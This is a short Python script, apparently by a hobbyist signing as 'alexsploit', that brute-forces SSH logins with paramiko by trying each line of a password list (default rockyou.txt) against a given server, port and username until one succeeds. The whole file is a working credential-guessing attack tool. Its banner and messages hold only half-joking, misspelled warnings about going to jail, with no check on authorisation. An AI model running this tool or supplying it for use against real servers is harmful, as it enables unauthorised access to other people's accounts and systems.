import argparse
import paramiko, sys, os, termcolor, socket

def banner():
    print("""\n
______________________________
| made by:alexsploit         |
| you are not do this for bad|
| stuff right are you can go |
| rt jail just for saftiy    |
-----------------------------""")

print(banner())
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--username', help="type targets username of the server")
parser.add_argument('-f', '--file', help="type your password list default rockyou.txt")
parser.add_argument('-s', '--server', help="the target server or ip address")
parser.add_argument('-p', '--port', help="type port ssh/telnet>22 ftp>20 vnc>5900")
arg = parser.parse_args()

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(arg.server, port=arg.port, username=arg.username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code

print("[!!] starting attack ")
print("[+] you are not doing this for ilegall reasons right")
print("[+] you can go to jail")


if os.path.exists(arg.file) == False:
    print("this is not a passlist on your dir")
    sys.exit(1)

with open(arg.file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored("[+] found password:" + password + " to the username:" + arg.username))
                break
            elif response == 1:
                pass
            elif response == 2:
                print("[+] cannot connect")
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
